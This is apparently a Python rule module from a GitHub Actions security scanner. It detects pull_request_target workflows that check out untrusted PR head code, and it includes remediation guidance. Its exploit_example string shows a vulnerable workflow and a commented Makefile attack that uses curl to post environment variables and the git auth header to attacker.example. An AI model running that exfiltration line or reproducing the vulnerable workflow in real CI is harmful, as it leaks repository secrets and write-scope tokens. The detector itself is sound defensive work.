"""GHA-002, pull_request_target must not check out the PR head."""
from __future__ import annotations

from typing import Any

from ...base import Finding, Location, Severity
from ...rule import Rule
from ..base import iter_jobs, iter_steps, step_location, workflow_triggers
from ._helpers import PR_HEAD_REF_RE

RULE = Rule(
    id="GHA-002",
    title="pull_request_target checks out PR head",
    severity=Severity.CRITICAL,
    owasp=("CICD-SEC-4",),
    esf=("ESF-D-INJECTION", "ESF-D-BUILD-ENV"),
    cwe=("CWE-78",),
    recommendation=(
        "Use `pull_request` instead of `pull_request_target` for any "
        "workflow that must run untrusted code. If you need write "
        "scope, split the workflow: a `pull_request_target` job that "
        "labels the PR, and a separate `pull_request`-triggered job "
        "that builds it with read-only secrets."
    ),
    docs_note=(
        "`pull_request_target` runs with a write-scope GITHUB_TOKEN "
        "and access to repository secrets, deliberately so, since "
        "it's how labeling and comment-bot workflows work. When the "
        "same workflow then explicitly checks out the PR head "
        "(`ref: ${{ github.event.pull_request.head.sha }}` or `.ref`) "
        "it executes attacker-controlled code with those privileges."
    ),
    incident_refs=(
        "GitHub Security Lab: "
        "[Preventing pwn requests](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/) "
        "(2020), the canonical write-up. Demonstrates how a fork "
        "PR that lands in a ``pull_request_target`` workflow with "
        "the PR head checked out runs in the base repo's "
        "privileged context.",
        "[Keeping your GitHub Actions and workflows secure: "
        "Untrusted input](https://securitylab.github.com/resources/github-actions-untrusted-input/) "
        "(GitHub Security Lab, 2020): catalogued real-world Actions "
        "carrying the same primitive. The fix pattern (split the "
        "workflow into a privileged labeler + an unprivileged "
        "builder) is now standard guidance.",
    ),
    exploit_example=(
        "# Vulnerable: pull_request_target + checkout PR head =\n"
        "# attacker code runs with secrets + write-scope token.\n"
        "name: build-pr\n"
        "on:\n"
        "  pull_request_target:\n"
        "    branches: [main]\n"
        "jobs:\n"
        "  build:\n"
        "    runs-on: ubuntu-latest\n"
        "    steps:\n"
        "      - uses: actions/checkout@<sha>\n"
        "        with:\n"
        "          ref: ${{ github.event.pull_request.head.sha }}\n"
        "      - run: make test            # runs PR-head Makefile\n"
        "\n"
        "# Attack: any external contributor opens a fork PR with a\n"
        "# tampered Makefile:\n"
        "#\n"
        "#   test:\n"
        "#   \tcurl -X POST https://attacker.example/exfil \\\n"
        "#   \t  -d \"$(env)\" \\\n"
        "#   \t  -d \"$(git config --get-all http.https://github.com/.extraheader)\"\n"
        "#\n"
        "# CI runs the malicious target with the base repo's secrets\n"
        "# (every ${{ secrets.* }} the workflow has access to) and a\n"
        "# write-scope GITHUB_TOKEN. The PR doesn't even need to be\n"
        "# merged or reviewed. The privileged execution happens at\n"
        "# PR-open time.\n"
        "\n"
        "# Safe: split the workflow. The labeler runs with secrets\n"
        "# but never checks out PR head; the builder runs in\n"
        "# ``pull_request`` context with no secrets:\n"
        "name: triage      # privileged half\n"
        "on: { pull_request_target: { types: [opened, synchronize] } }\n"
        "jobs:\n"
        "  label:\n"
        "    runs-on: ubuntu-latest\n"
        "    steps:\n"
        "      - run: gh pr edit ${{ github.event.number }} --add-label triage\n"
        "        env:\n"
        "          GH_TOKEN: ${{ github.token }}\n"
        "---\n"
        "name: build       # unprivileged half\n"
        "on: { pull_request: {} }\n"
        "jobs:\n"
        "  build:\n"
        "    runs-on: ubuntu-latest\n"
        "    steps:\n"
        "      - uses: actions/checkout@<sha>     # checks out PR head\n"
        "      - run: make test                    # no secrets in scope"
    ),
)


def check(path: str, doc: dict[str, Any]) -> Finding:
    if "pull_request_target" not in workflow_triggers(doc):
        return Finding(
            check_id=RULE.id, title=RULE.title, severity=RULE.severity,
            resource=path,
            description="Workflow is not triggered by pull_request_target.",
            recommendation="No action required.", passed=True,
        )
    offending: list[str] = []
    locations: list[Location] = []
    # Preserve insertion order without duplicates so the reachability-
    # aware chain engine (AC-001 / AC-006 / AC-009 / AC-029) can
    # intersect with the impact-side anchors. A job with multiple
    # offending checkouts only contributes once.
    anchor_jobs: dict[str, None] = {}
    for job_id, job in iter_jobs(doc):
        for idx, step in enumerate(iter_steps(job)):
            uses = step.get("uses")
            if not isinstance(uses, str) or not uses.lower().startswith(
                "actions/checkout@"
            ):
                continue
            ref = ((step.get("with") or {}).get("ref") or "")
            if isinstance(ref, str) and PR_HEAD_REF_RE.search(ref):
                offending.append(f"{job_id}[{idx}]")
                locations.append(step_location(path, step))
                anchor_jobs[job_id] = None
    passed = not offending
    desc = (
        "pull_request_target workflow does not check out untrusted PR head code."
        if passed else
        f"pull_request_target workflow explicitly checks out the PR head "
        f"ref in steps: {', '.join(offending)}. This executes attacker-"
        f"controlled code with a write-scope GITHUB_TOKEN and access to "
        f"repository secrets."
    )
    return Finding(
        check_id=RULE.id, title=RULE.title, severity=RULE.severity,
        resource=path, description=desc,
        recommendation=RULE.recommendation, passed=passed,
        locations=locations,
        job_anchors=tuple(anchor_jobs),
    )
